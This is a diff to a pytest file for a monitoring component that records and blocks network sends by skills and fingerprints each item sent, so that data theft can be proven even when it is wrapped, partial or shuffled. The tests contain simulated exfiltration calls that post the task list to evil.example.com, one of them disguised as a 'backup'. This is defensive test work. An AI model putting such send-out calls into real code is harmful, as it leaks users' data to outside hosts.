@@ -21,6 +21,7 @@ import pytest
 from app.monitor import audit_hook
 from app.monitor.observations import ObservationLog
 from app.skills.context import CapabilityRefused, SkillContext
+from app.storage.seed import seed_tasks_if_absent
 
 
 @pytest.fixture(autouse=True)
@@ -31,6 +32,23 @@ def _watcher_installed():
 
 @pytest.fixture
 def running_skill(tmp_settings):
+    notebook = ObservationLog("inv_test")
+    context = SkillContext("inv_test", notebook)
+    with audit_hook.invocation_scope("inv_test", notebook):
+        yield context, notebook
+
+
+@pytest.fixture
+def running_skill_with_tasks(tmp_settings):
+    """
+    Same as running_skill, but with the starter task list already in place.
+
+    The tasks are seeded BEFORE the watched scope begins, on purpose: seeding writes
+    the tasks file, and if that happened while a skill was "running" the process-wide
+    watcher would record it as the skill touching files. Seeding first keeps the
+    notebook clean, so its first line is the skill's own first action.
+    """
+    seed_tasks_if_absent()
     notebook = ObservationLog("inv_test")
     context = SkillContext("inv_test", notebook)
     with audit_hook.invocation_scope("inv_test", notebook):
@@ -81,15 +99,23 @@ def test_a_blocked_attempt_still_records_what_it_wanted_to_send(running_skill):
     assert record.detail["method"] == "POST"
     assert record.detail["bytes"] > 0
     assert len(record.detail["sha256"]) == 64
+    # ACCEPTANCE TEST A-9 (extends A-18 to the sending side) - decision S-1.
+    # The send now also carries a fingerprint of each item inside it, so a later
+    # check can prove which items were sent, not just that *something* was sent.
+    assert len(record.detail["item_digests"]) == 2
+    assert all(len(digest) == 64 for digest in record.detail["item_digests"])
     assert record.outcome == "refused"
 
 
-def test_the_fingerprint_of_a_blocked_send_matches_the_data_that_was_read(running_skill):
+def test_the_fingerprint_of_a_blocked_send_matches_the_data_that_was_read(running_skill_with_tasks):
     """
     This is the mechanism that lets a later check prove "the thing sent is the thing
     that was read from the task list" - the basis of catching quiet data theft.
+
+    When the tasks are sent exactly as read, the whole-message fingerprint matches,
+    and so does every per-item fingerprint.
     """
-    context, notebook = running_skill
+    context, notebook = running_skill_with_tasks
 
     tasks = context.tasks.list("all")
     with pytest.raises(CapabilityRefused):
@@ -97,6 +123,47 @@ def test_the_fingerprint_of_a_blocked_send_matches_the_data_that_was_read(runnin
 
     read_record, send_record = notebook.entries()
     assert read_record.detail["sha256"] == send_record.detail["sha256"]
+    # Every task read has a matching fingerprint on the sending side.
+    assert set(read_record.detail["item_digests"]) == set(send_record.detail["item_digests"])
+    assert len(send_record.detail["item_digests"]) >= 3
+
+
+def test_wrapped_or_partial_sends_still_carry_the_read_fingerprints(running_skill_with_tasks):
+    """
+    ACCEPTANCE TEST A-9 (extends A-18) - decision S-1.
+
+    A real thief rarely posts the list exactly as read. The per-item fingerprints
+    still match when the tasks are hidden inside an envelope, when only some are sent,
+    and when they are shuffled - even though the whole-message fingerprint no longer
+    matches in any of those cases. That whole-message mismatch is the point: a single
+    fingerprint of the whole message would miss every one of these; the per-item
+    fingerprints do not.
+    """
+    context, notebook = running_skill_with_tasks
+
+    tasks = context.tasks.list("all")
+    read_digests = set(notebook.entries()[0].detail["item_digests"])
+    assert len(read_digests) >= 3  # the seeded list is substantial enough to subset
+
+    # Wrapped inside a bigger message, exactly as standup_sync will do it.
+    with pytest.raises(CapabilityRefused):
+        context.net.post("https://evil.example.com/c", json={"kind": "backup", "items": tasks})
+    wrapped = notebook.entries()[-1]
+
+    # Only some of the tasks, and in a different order.
+    subset = list(reversed(tasks[:3]))
+    with pytest.raises(CapabilityRefused):
+        context.net.post("https://evil.example.com/c", json={"items": subset})
+    partial = notebook.entries()[-1]
+
+    # The whole-message fingerprint no longer matches once the data is wrapped...
+    assert wrapped.detail["sha256"] != notebook.entries()[0].detail["sha256"]
+    # ...but every wrapped item's fingerprint is still one of the ones that were read.
+    assert set(wrapped.detail["item_digests"]) == read_digests
+    # And a shuffled subset is a genuine subset of what was read - nothing invented.
+    partial_digests = set(partial.detail["item_digests"])
+    assert partial_digests <= read_digests
+    assert len(partial_digests) == 3
 
 
 @pytest.mark.parametrize("local_address", ["http://127.0.0.1:9/x", "http://localhost:9/x"])
